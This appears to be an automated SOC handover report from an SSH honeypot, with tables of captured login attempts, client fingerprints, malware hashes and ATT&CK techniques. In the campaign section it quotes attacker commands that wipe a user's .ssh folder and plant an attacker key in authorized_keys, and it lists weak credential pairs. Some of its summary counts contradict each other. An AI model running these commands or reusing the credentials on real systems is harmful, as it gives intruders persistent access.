# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-08-13 |
| **Generated At** | 2026-08-13T22:47:42Z |
| **Shift Time** | 22:47 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **229** |
| Confirmed Threats | **0** |
| False Positives Filtered | **229** (100.0%) |
| Unique Attacker IPs | **85** |
| Countries of Origin | **0** |
| High Severity Cases | **132** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **97** |
| Malware Samples Analyzed | **2** HIGH · **23** MED · 20 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **151** |
| Unique Credential Pairs | **111** |
| Unique Usernames | **63** |
| Unique Passwords | **84** |
| Successful Auth Pairs | **139** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 26 |
| `admin` | 13 |
| `nobody` | 12 |
| `config` | 10 |
| `debian` | 7 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `uploader` | 11 |
| `123456` | 9 |
| `123123123` | 6 |
| `77` | 5 |
| `` | 5 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `nobody` | `123123123` | 6 |
| `debian` | `uploader` | 6 |
| `config` | `uploader` | 5 |
| `admin` | `77` | 5 |
| `config` | `123qwe` | 5 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `admin` | `admin123` | `27.79.7.188` | 2026-08-13T18:55:17 |
| `root` | `abc,123` | `125.142.37.91` | 2026-08-13T18:55:24 |
| `345gs5662d34` | `345gs5662d34` | `125.142.37.91` | 2026-08-13T18:55:28 |
| `root` | `3245gs5662d34` | `125.142.37.91` | 2026-08-13T18:55:29 |
| `user` | `1234` | `27.79.7.188` | 2026-08-13T18:57:36 |
| `admin` | `default` | `27.79.7.188` | 2026-08-13T18:59:55 |
| `ftp` | `ftp` | `27.79.7.188` | 2026-08-13T19:02:42 |
| `operator` | `operator` | `116.99.172.41` | 2026-08-13T19:02:55 |
| `support` | `admin` | `27.79.7.188` | 2026-08-13T19:04:28 |
| `test` | `5555555` | `196.188.187.205` | 2026-08-13T19:05:22 |
| `support` | `support` | `176.53.159.196` | 2026-08-13T19:05:39 |
| `test` | `5555555` | `87.103.126.54` | 2026-08-13T19:05:45 |
| `root` | `ipscan` | `27.79.7.188` | 2026-08-13T19:08:00 |
| `nobody` | `administrator` | `122.224.164.194` | 2026-08-13T19:11:37 |
| `config` | `uploader` | `200.232.114.71` | 2026-08-13T19:12:48 |
| `config` | `uploader` | `67.85.146.216` | 2026-08-13T19:12:55 |
| `admin` | `77` | `10.0.0.73` | 2026-08-13T19:21:16 |
| `config` | `uploader` | `10.0.0.73` | 2026-08-13T19:24:17 |
| `test` | `9999` | `10.0.0.73` | 2026-08-13T19:27:58 |
| `support` | `support` | `10.0.0.73` | 2026-08-13T19:29:23 |
| `test` | `9999` | `178.178.222.55` | 2026-08-13T19:29:37 |
| `test` | `9999` | `203.92.36.109` | 2026-08-13T19:29:50 |
| `root` | `password@123` | `116.123.150.231` | 2026-08-13T19:34:04 |
| `345gs5662d34` | `345gs5662d34` | `116.123.150.231` | 2026-08-13T19:34:07 |
| `root` | `3245gs5662d34` | `116.123.150.231` | 2026-08-13T19:34:09 |
| `admin` | `77` | `65.20.143.45` | 2026-08-13T19:40:00 |
| `admin` | `77` | `176.12.132.63` | 2026-08-13T19:40:09 |
| `admin` | `77` | `220.128.137.164` | 2026-08-13T19:40:13 |
| `config` | `uploader` | `14.49.195.142` | 2026-08-13T19:41:52 |
| `root` | `wZbCPImFzO` | `10.0.0.73` | 2026-08-13T19:44:09 |
| `nobody` | `123123123` | `117.211.15.106` | 2026-08-13T19:46:59 |
| `nobody` | `123123123` | `138.219.13.21` | 2026-08-13T19:47:06 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236:2323` | `35.203.210.77` | 2026-08-13T19:53:20 |
| `nobody` | `123123123` | `10.0.0.73` | 2026-08-13T19:58:31 |
| `debian` | `uploader` | `10.0.0.73` | 2026-08-13T20:02:08 |
| `debian` | `uploader` | `115.46.88.68` | 2026-08-13T20:03:44 |
| `debian` | `uploader` | `122.170.99.195` | 2026-08-13T20:03:52 |
| `nobody` | `alpine` | `58.57.154.146` | 2026-08-13T20:14:22 |
| `nobody` | `alpine` | `121.179.93.147` | 2026-08-13T20:14:31 |
| `nobody` | `alpine` | `39.164.91.67` | 2026-08-13T20:14:35 |
| `nobody` | `alpine` | `45.236.19.9` | 2026-08-13T20:14:43 |
| `nobody` | `123123123` | `218.202.143.68` | 2026-08-13T20:15:32 |
| `nobody` | `123123123` | `220.128.137.164` | 2026-08-13T20:15:42 |
| `debian` | `uploader` | `46.201.247.21` | 2026-08-13T20:19:52 |
| `debian` | `uploader` | `186.239.41.74` | 2026-08-13T20:20:00 |
| `config` | `123qwe` | `10.0.0.73` | 2026-08-13T20:29:56 |
| `guest` | `passw0rd` | `196.191.142.67` | 2026-08-13T20:37:41 |
| `guest` | `passw0rd` | `65.20.153.146` | 2026-08-13T20:37:49 |
| `config` | `123qwe` | `31.41.84.98` | 2026-08-13T20:48:27 |
| `config` | `123qwe` | `93.62.72.229` | 2026-08-13T20:48:35 |
| `config` | `123qwe` | `186.239.41.74` | 2026-08-13T20:48:42 |
| `root` | `1qaz@WSX` | `45.156.87.253` | 2026-08-13T20:49:33 |
| `user3` | `user3` | `45.156.87.253` | 2026-08-13T20:49:38 |
| `gns3` | `gns3` | `45.156.87.253` | 2026-08-13T20:49:42 |
| `minecraft` | `1234567890` | `45.156.87.253` | 2026-08-13T20:49:46 |
| `teamspeak` | `raspberry` | `45.156.87.253` | 2026-08-13T20:49:50 |
| `admin` | `abc123` | `45.156.87.253` | 2026-08-13T20:49:55 |
| `root` | `Password` | `45.156.87.253` | 2026-08-13T20:49:59 |
| `root` | `11` | `45.156.87.253` | 2026-08-13T20:50:03 |
| `guest` | `123456` | `45.156.87.253` | 2026-08-13T20:50:07 |
| `frappe` | `frappe` | `45.156.87.253` | 2026-08-13T20:50:11 |
| `debian` | `qwerty` | `45.156.87.253` | 2026-08-13T20:50:15 |
| `claude` | `claude` | `45.156.87.253` | 2026-08-13T20:50:20 |
| `devops` | `123456789` | `45.156.87.253` | 2026-08-13T20:50:24 |
| `ftp` | `123456` | `45.156.87.253` | 2026-08-13T20:50:29 |
| `root` | `abc12345` | `45.156.87.253` | 2026-08-13T20:50:33 |
| `root` | `!QAZ2wsx3edc` | `45.156.87.253` | 2026-08-13T20:50:37 |
| `kipt` | `kipt` | `45.156.87.253` | 2026-08-13T20:50:42 |
| `user` | `123456` | `45.156.87.253` | 2026-08-13T20:50:47 |
| `root` | `12qwaszx` | `45.156.87.253` | 2026-08-13T20:50:50 |
| `root` | `1Q2w3e4r` | `45.156.87.253` | 2026-08-13T20:50:54 |
| `bot` | `123456` | `45.156.87.253` | 2026-08-13T20:50:58 |
| `operator` | `operator2026` | `45.156.87.253` | 2026-08-13T20:51:03 |
| `sam` | `1234567890` | `45.156.87.253` | 2026-08-13T20:51:07 |
| `botuser` | `123` | `45.156.87.253` | 2026-08-13T20:51:11 |
| `administrator` | `Passw0rd` | `45.156.87.253` | 2026-08-13T20:51:15 |
| `dmdba` | `123456` | `45.156.87.253` | 2026-08-13T20:51:20 |
| `root1` | `1` | `45.156.87.253` | 2026-08-13T20:51:24 |
| `ai` | `123456` | `45.156.87.253` | 2026-08-13T20:51:28 |
| `nutanix` | `nutanix/4u` | `45.156.87.253` | 2026-08-13T20:51:32 |
| `toto` | `toto` | `45.156.87.253` | 2026-08-13T20:51:36 |
| `kafka` | `kafka` | `45.156.87.253` | 2026-08-13T20:51:41 |
| `ftpuser` | `123` | `45.156.87.253` | 2026-08-13T20:51:45 |
| `user10` | `user10` | `45.156.87.253` | 2026-08-13T20:51:49 |
| `minecraft` | `123123` | `45.156.87.253` | 2026-08-13T20:51:53 |
| `root` | `1qaz!QAZ` | `45.156.87.253` | 2026-08-13T20:51:58 |
| `deploy` | `1` | `45.156.87.253` | 2026-08-13T20:52:02 |
| `ubuntu` | `root` | `45.156.87.253` | 2026-08-13T20:52:06 |
| `runner` | `runner` | `45.156.87.253` | 2026-08-13T20:52:10 |
| `ubnt` | `987654321` | `220.122.115.9` | 2026-08-13T20:52:10 |
| `oscar` | `oscar` | `45.156.87.253` | 2026-08-13T20:52:14 |
| `postgres` | `123456` | `45.156.87.253` | 2026-08-13T20:52:18 |
| `root` | `P@ssword` | `45.156.87.253` | 2026-08-13T20:52:22 |
| `ubnt` | `987654321` | `156.238.86.2` | 2026-08-13T20:52:24 |
| `git` | `123456` | `45.156.87.253` | 2026-08-13T20:52:27 |
| `crafty` | `1234` | `45.156.87.253` | 2026-08-13T20:52:31 |
| `redhat` | `redhat` | `45.156.87.253` | 2026-08-13T20:52:35 |
| `azureuser` | `12345` | `45.156.87.253` | 2026-08-13T20:52:40 |
| `rocky` | `1` | `45.156.87.253` | 2026-08-13T20:52:44 |
| `fivem` | `fivem` | `45.156.87.253` | 2026-08-13T20:52:48 |
| `deploy` | `!Q2w3e4r` | `45.156.87.253` | 2026-08-13T20:52:52 |
| `root` | `111111` | `45.156.87.253` | 2026-08-13T20:52:57 |
| `sftpuser` | `sftpuser` | `45.156.87.253` | 2026-08-13T20:53:01 |
| `root` | `aa123456` | `45.156.87.253` | 2026-08-13T20:53:05 |
| `ts3` | `ts3` | `45.156.87.253` | 2026-08-13T20:53:08 |
| `sam` | `1qaz@WSX` | `45.156.87.253` | 2026-08-13T20:53:13 |
| `cursor` | `cursor` | `45.156.87.253` | 2026-08-13T20:53:16 |
| `user` | `12345678` | `45.156.87.253` | 2026-08-13T20:53:20 |
| `root` | `1qaz2wsx` | `45.156.87.253` | 2026-08-13T20:53:24 |
| `default` | `default` | `45.156.87.253` | 2026-08-13T20:53:28 |
| `guest` | `guest123` | `45.156.87.253` | 2026-08-13T20:53:32 |
| `elastic` | `123456` | `45.156.87.253` | 2026-08-13T20:53:36 |
| `root` | `Huawei123` | `45.156.87.253` | 2026-08-13T20:53:40 |
| `server` | `1234` | `45.156.87.253` | 2026-08-13T20:53:44 |
| `root` | `123@@@` | `64.110.90.250` | 2026-08-13T20:53:45 |
| `root` | `LeitboGi0ro` | `64.110.90.250` | 2026-08-13T20:53:45 |
| `app` | `root` | `45.156.87.253` | 2026-08-13T20:53:48 |
| `deployer` | `user` | `45.156.87.253` | 2026-08-13T20:53:52 |
| `guest` | `passw0rd` | `202.72.196.75` | 2026-08-13T20:53:55 |
| `kim` | `kim123` | `45.156.87.253` | 2026-08-13T20:53:56 |
| `test1` | `123456789` | `45.156.87.253` | 2026-08-13T20:53:59 |
| `deployer` | `deployer` | `45.156.87.253` | 2026-08-13T20:54:03 |
| `guest` | `passw0rd` | `177.159.150.111` | 2026-08-13T20:54:04 |
| `deploy` | `1234` | `45.156.87.253` | 2026-08-13T20:54:08 |
| `z` | `qwe123` | `45.156.87.253` | 2026-08-13T20:54:11 |
| `root` | `12345678` | `45.156.87.253` | 2026-08-13T20:54:15 |
| `root` | `28011988` | `45.156.87.253` | 2026-08-13T20:54:19 |
| `newuser` | `newuser` | `45.156.87.253` | 2026-08-13T20:54:23 |
| `ansible` | `qwerty` | `45.156.87.253` | 2026-08-13T20:54:27 |
| `sonar` | `sonar` | `45.156.87.253` | 2026-08-13T20:54:30 |
| `appuser` | `password` | `45.156.87.253` | 2026-08-13T20:54:34 |
| `guest` | `abc123` | `45.156.87.253` | 2026-08-13T20:54:38 |
| `admin` | `0000` | `45.156.87.253` | 2026-08-13T20:54:42 |
| `deploy` | `qwerty` | `45.156.87.253` | 2026-08-13T20:54:46 |
| `private` | `private` | `45.156.87.253` | 2026-08-13T20:54:49 |
| `tomcat` | `tomcat` | `45.156.87.253` | 2026-08-13T20:54:53 |
| `root` | `` | `176.65.139.226` | 2026-08-13T20:54:55 |
| `root` | `q1w2e3r4` | `45.156.87.253` | 2026-08-13T20:54:57 |
| `odoo18` | `123` | `45.156.87.253` | 2026-08-13T20:55:01 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **229** |
| Sessions with Fingerprint | **11** |
| Unique HASSH Fingerprints | **11** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| Go SSH scanner | 91 |
| OpenSSH | 37 |
| libssh | 13 |
| AsyncSSH (Python) | 7 |
| Paramiko (Python) | 2 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `0a07365cc01f...` | Generic scanner | 81 | 1 |
| `acaa53e0a7d7...` | Mirai/variant | 37 | 34 |
| `fda360b1b4f4...` | Mirai/variant | 7 | 2 |
| `f555226df196...` | Mirai/variant | 6 | 2 |
| `4e066189c3bb...` | Generic scanner | 6 | 2 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `0a07365cc01f...` | Go SSH scanner | 81 | 1 | Generic scanner |
| `acaa53e0a7d7...` | OpenSSH | 37 | 34 | Mirai/variant |
| `fda360b1b4f4...` | AsyncSSH (Python) | 7 | 2 | Mirai/variant |
| `95420f9d932d...` | libssh | 7 | 3 | — |
| `f555226df196...` | libssh | 6 | 2 | Mirai/variant |
| `4e066189c3bb...` | Go SSH scanner | 6 | 2 | Generic scanner |
| `f1e5e9d24e5e...` | Go SSH scanner | 2 | 1 | Mirai/variant |
| `a2de0f306611...` | Paramiko (Python) | 2 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **3** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 2 | 2 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `116.123.150.231`, `125.142.37.91`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **85** |
| Unique ASNs | **62** |
| High-Risk ASNs | **0** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS4134` | CHINANET BACKBONE | 7 | LOW |
| `AS63949` | Akamai Connected Cloud | 6 | LOW |
| `AS4837` | CHINA UNICOM China169 Backbone | 5 | LOW |
| `AS4766` | Korea Telecom | 4 | LOW |
| `AS1257` | Tele2 Sverige AB | 2 | LOW |
| `AS396982` | Google LLC | 2 | LOW |
| `AS10429` | TELEFÔNICA BRASIL S.A | 2 | LOW |
| `AS203214` | Hulum Almustakbal Company for Communication Engineering and Services Ltd | 2 | LOW |

---

---

## 🚨 Priority Cases — Immediate Attention (0)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

_No priority cases this shift. All confirmed sessions were credential scans only._

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

_No reconnaissance sessions this shift._

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 64/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 45/100 | 🟡 MEDIUM | **38/74** 🔴 |
| `049a2ed3406e7c70ce358c108d1f57001d6f2f1f924215f06d9e43b6c213f62b` | ELF Binary (Linux executable) (ARM 32-bit) | `049a2ed3406e7c70...` | 42/100 | 🟡 MEDIUM | **31/75** 🔴 |
| `09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `09591253a95411d6...` | 86/100 | 🔴 HIGH | **41/75** 🔴 |
| `0b5fec6e8ed11eb6d3e389cc82184d2f15121e35e4c56f1570af01230cb2d84b` | Unknown binary | `0b5fec6e8ed11eb6...` | 0/100 | 🟢 LOW | Not in VT |
| `0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca` | Unknown binary | `0db4656687a425c4...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0dc95fb4077cce0bff19aa1a77109d059dff6503bbf6c1b0dd2f41fc0a4c88e7` | Unknown binary | `0dc95fb4077cce0b...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `11707e3902992c8e20e19de09cbc78381e43234c4560a706a031fe01ce7e96fb` | ELF Binary (Linux executable) (x86-64 64-bit) | `11707e3902992c8e...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **15/75** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` | Bash Script | `183fb8e38eeb1160...` | 84/100 | 🔴 HIGH | **35/75** 🔴 |
| `1858c51b58e913ca8d868ea94493ad1c74fad15ce283d94c10c22ceb3e92541d` | ELF Binary (Linux executable) (AArch64 64-bit) | `1858c51b58e913ca...` | 41/100 | 🟡 MEDIUM | **29/75** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 69/100 | 🟡 MEDIUM | **23/75** 🔴 |
| `1e70b63472772e3f5092ffe9c3573470e73590e6ab6d93fdcede1d368a5fd72d` | Bash Script | `1e70b63472772e3f...` | 60/100 | 🟡 MEDIUM | **26/75** 🔴 |
| `1e7c134cf160b486708c40c21f671cd6f53c7578a8047a4eb22f668476e0c4c4` | ELF Binary (Linux executable) (unknown (e_machine=0x102) 64-bit) | `1e7c134cf160b486...` | 54/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `1ed8ba8b6936fd378c18a7aafeef6db8575f8ce679ab93ae7c1b36493f7bd65b` | ELF Binary (Linux executable) (MIPS 32-bit) | `1ed8ba8b6936fd37...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `1eecf2377d20768c28d741e21affaa53cf26db0d083efdbf43a92fa938b7e4be` | ELF Binary (Linux executable) (ARM 32-bit) | `1eecf2377d20768c...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `20260630-221457-3e8812e60d6c-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144928-0dd2c2474d24-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `21e99667e2f0e73d12aae89f8cabd338426ab1fe4ce828ec93c07de615ef754c` | ELF Binary (Linux executable) (AArch64 64-bit) | `21e99667e2f0e73d...` | 63/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `27d205dc183ea2fad0e55e10b206404be20908e39a74569ff99182d7326ed9c0` | ELF Binary (Linux executable) (x86-64 64-bit) | `27d205dc183ea2fa...` | 45/100 | 🟡 MEDIUM | **38/74** 🔴 |
| `287962211de7bcadb39f7576732438b43ee6aab420ec23c29a9d12a8151a547f` | ELF Binary (Linux executable) (x86 32-bit) | `287962211de7bcad...` | 42/100 | 🟡 MEDIUM | **31/75** 🔴 |
| `289fd4a7a10aaf8aa313ab80cc170018fc662d0a7d034a3b92b9d3d3945b0736` | ELF Binary (Linux executable) (x86-64 64-bit) | `289fd4a7a10aaf8a...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `2a39d592018600e4b3db2caed6cdaa8c651d3dacbebf8ac1f0960e493843c435` | ELF Binary (Linux executable) (x86-64 64-bit) | `2a39d592018600e4...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |
| `2bd2ab1d4b75aa2b4eed1af697188b8bce35a882faf4335cb4fafc2847197995` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `2bd2ab1d4b75aa2b...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `2f206563640dd66a743ffd493ce0e3c31a8fc5a24b9f5d2b540fc22d45c13d66` | ELF Binary (Linux executable) (x86 32-bit) | `2f206563640dd66a...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `31d4181843b1ed10a7e7cb3f108f6d6c50a7a4452ee52ddacabe8ca77260615e` | Bash Script | `31d4181843b1ed10...` | 58/100 | 🟡 MEDIUM | **20/75** 🔴 |

**Suspicious Indicators — HIGH Severity Samples:**

_`09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` (09591253a95411d60c2b0d53...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` (183fb8e38eeb1160f392f6d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `chmod +x (make executable)` — `chmod +x`

---

## 🌐 Top Attacker IPs by Abuse Score

_No enriched IPs with abuse scores available._

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 151 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 132 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 3 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 2 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 2 |

---

## 🔕 False Positive Summary (229 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 229 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 229 cases |
| Tool 34  | Credential Extractor        | ✅ 151 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 11 fingerprints |
| Tool 36  | Command Clustering          | ✅ 3 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 85 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 229 filtered (100.0%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 62 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 21 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 0 priority case(s) shown individually · 0 recon entry/entries in table (0 group(s) consolidating 0 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
